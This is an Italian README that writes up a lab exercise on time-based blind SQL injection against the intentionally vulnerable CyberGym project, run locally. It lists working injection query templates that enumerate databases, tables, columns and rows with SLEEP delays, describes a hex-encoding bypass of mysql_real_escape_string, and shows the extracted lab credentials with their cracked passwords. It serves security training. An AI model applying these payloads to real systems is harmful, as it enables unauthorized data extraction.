## Time based blind SQLi

La challenge prevede la preparazione di uno script in linguaggio a piacere (ho scelto il python) per l'exploit della vulnerabilità
che permette SQLi di tipo Time-based blind su due pagine del progetto [CyberGym](https://github.com/AvalZ/cyber-gym) 
(nel mio caso installato su una macchina virtuale eseguita in locale).

Lo svolgimento della prima challenge si può trovare [qui](Time-Based_Blind.md)

Lo svolgimento della seconda [qui](Time-Based_Blind_escaped.md)

Lo script scritto per la loro risoluzione è il [blind_sqli.py](blind_sqli.py) (python 3) presente nel repository.

I dati di login recuperati dalla tabella accounts sono i seguenti:

email            : password(sha1)                           : password in chiaro
----------------------------------------------------------------------------------------------------------------------
arthur@guide.com : d00ee262cdcbe7543210bb85f6f1cac257b4e994 : Bathrobe
----------------------------------------------------------------------------------------------------------------------
ford@guide.com   : 30f5cc99c17426a0d28acf8905c6d776039ad022 : Betelgeuse
----------------------------------------------------------------------------------------------------------------------
tricia@guide.com : bcb3358e273b5772ee0ae1799b612e13cc726b04 : Trillian
----------------------------------------------------------------------------------------------------------------------
zaphod@guide.com : 0c38530eaca4dbc0f49c459c0c52b362f14215c3 : Pan-GalacticGargleBlaster

Le password in chiaro sono state ottenute attraverso lo script [Hash Buster v3.0](https://github.com/s0md3v/Hash-Buster)

Per entrambe le challenge è stato usato lo stesso numero di coppie di query, per le quali è stato modificato il "wrapping"
in modo generare il payload a seconda della tipologia di parametro che si andava a sfruttare:

1. recupero database:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_databases FROM information_schema.schemata)x WHERE x.n_databases = {} AND SLEEP(0.1)"
	- extraction: "SELECT * FROM(SELECT schema_name FROM information_schema.schemata LIMIT {},1)x WHERE MID(x.schema_name,{},1) = {} AND SLEEP(0.1)"
2. recupero nomi tabelle:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_tables FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + "))x WHERE x.n_tables = {} AND SLEEP(0.1)"
	- extraction: "SELECT * FROM(SELECT table_name FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + ") LIMIT {},1)x WHERE MID(x.table_name,{},1) = {} AND SLEEP(0.1)"
3. recupero nomi colonne e tipo dato nelle tabelle:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_columns FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + "))x WHERE x.n_columns = {} AND SLEEP(0.1)"
	- extraction: "SELECT * FROM(SELECT CONCAT(column_name,"+hex(ord(':'))+",column_type) AS column_info FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + ") LIMIT {},1)x WHERE MID(x.column_info,{},1) = {} AND SLEEP(0.1)"
4. recupero dati presenti nelle colonne passate in input:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_rows FROM  " + db + '.' + table + ")x WHERE n_rows = {} AND SLEEP(0.1)"
	- extracton: "SELECT * FROM(SELECT CONCAT(" + columns_concat + ") AS data FROM " + db + '.' + table + " LIMIT {},1)x WHERE MID(x.data,{},1) = {} AND SLEEP(0.1)"
	
dove:
	- database_hex: lista dei caratteri, separati da virgola, in codifica esadecimale da passare a concat per il bypass di 
					mysql_real_escape_string
	- table_hex: stessa cosa, ma per il nome della tabella passata in input
	
Infine, dall'analisi del jitter delle risposte ho notato che (nel mio ambiente locale, virtualizzato) questo era molto oscillante, ma comunque
si attestava sempre sotto i 0.1 secondi, portandomi a supporre questo valore come sufficiente per una corretta estrazione dei risultati cercati
per entrambe le challenge

Ho incluso nel repository due file .sh che ripercorrono che riepilogano tutti i passaggi necessari per l'estrazione.
